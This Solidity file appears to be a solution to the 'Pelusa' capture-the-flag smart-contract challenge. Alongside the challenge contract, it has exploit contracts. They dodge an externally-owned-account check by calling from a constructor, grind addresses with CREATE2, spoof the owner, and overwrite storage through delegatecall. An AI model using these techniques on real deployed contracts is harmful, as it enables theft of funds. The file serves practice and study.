pragma solidity >= 0.8.7;

// deploy this with `Peleusa`'s owner
contract Game {
    address public getBallPossesion;
    function updateOwner(address newOwner) public {
        getBallPossesion = newOwner;
    }
}

contract Pelusa {
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;

    constructor() {
        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
        /// @dev added for debugging. Does not affect challenge difficulty.
        _owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
    }

    function passTheBall() external {
        require(msg.sender.code.length == 0, "Only EOA players");
        require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

        player = msg.sender;
        /// @dev added for debugging. Does not affect challenge difficulty.
        _player = msg.sender;
    }

    function isGoal() public view returns (bool) {
        // expect ball in owners posession
        return Game(player).getBallPossesion() == owner;
    }

    function shoot() external {
        require(isGoal(), "missed");
				/// @dev use "the hand of god" trick
        (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
        require(success, "missed");
        require(uint256(bytes32(data)) == 22_06_1986);
    }

    /// @dev added for debugging. Does not affect challenge difficulty.
    address public _owner;
    /// @dev added for debugging. Does not affect challenge difficulty.
    address public _player;
}

contract ExploiterDeployer {
    function deploySimple(bytes calldata byteCode, uint salt) public returns(address newContract, bytes32 contractStart) {
        uint codeLength = byteCode.length;
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0x64, codeLength)
            contractStart := mload(ptr)
            newContract := create2(0, ptr, codeLength, salt)    
        }
    }
}

contract Exploiter {
    address immutable Pelusa;
    address internal player;
    uint public goals;
    address game;

    constructor() {
        Pelusa = 0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95; // pre-computed address. In practice, we would know where the Pelusa contract was deployed beforehand so would replace this value with the Pelusa address.
        // IPelusa(0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95).passTheBall();
        address(0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95).call(abi.encodeWithSignature("passTheBall()"));
        // player = address(new Game()); // this is actually the address of the **Game** contract
    }

    function updateGameAddress(address addr) public {
        game = addr;
    }
    
    function getBallPossesion() public view returns(address owner) {
        // game.call(abi.encodeWithSignature("owner()"));
        owner = Game(game).getBallPossesion();
    }

    function handOfGod() public returns(uint256 val) {
        goals = 2;
        // memory array is returned as 32 bytes of starting location, 32 bytes of length, and then actual values.
        // Coering type of `bytes memory` to `bytes32` is big-endian - `0x51` becomes `0x5100000...` - but if there are over 32 bytes, it will just be copied exactly.
            // i.e. 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a3078626162616261626100000000000000000000000000000000000000000000 gets coerced to `0x00...20`.
        // Given that, how to return the bytes version of `22_06_1986`? Does the array need to start at `150A3A2`?
        // never mind, you can just return a uint
        val = 22061986;
    }
}